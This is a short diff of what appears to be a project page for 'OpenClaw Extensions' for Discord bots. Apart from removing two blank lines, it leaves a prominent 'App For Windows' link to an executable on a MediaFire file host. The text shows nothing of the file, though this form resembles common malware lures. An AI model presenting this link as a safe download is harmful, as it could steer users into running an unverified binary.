@@ -13,14 +13,12 @@ layout: default
         <h3>Read Before Use</h3>
         <p>OpenClaw Extensions (for Discord) — By Warecario</p>
         <p>This is an extension manager for OpenClaw bots. Extensions add functionality to your bot.</p>
-        
         <div style="margin: 20px 0; padding: 15px; background: #1e1e1e; border-radius: 4px; border-left: 4px solid #007acc;">
             <a href="https://download937.mediafire.com/bvlh9qpwanjg6b8pL2Q_A0ObWllXQyznD6TbimtDoOoXsrlWgWMNNK1ZPXbU3rNBd8xCig59_Yj-74iLmO6RawCvy-tMoBysn-f6P5Frfq3H56SPmdJz1DmwdD37o8mBV0b_Ck0eA6YFfF4TaIy43BLZpuSL_E_dxs21kg1akVVANXU/je8xs0n47bktcol/OC-CarioPlugins-1-0.exe" 
                style="color: #007acc !important; font-weight: bold; text-decoration: none; font-size: 16px;">
                App For Windows
             </a>
         </div>
-
         <hr style="border: 0; border-top: 1px solid #333; margin: 20px 0;">
         <h4>How to use:</h4>
         <ol>
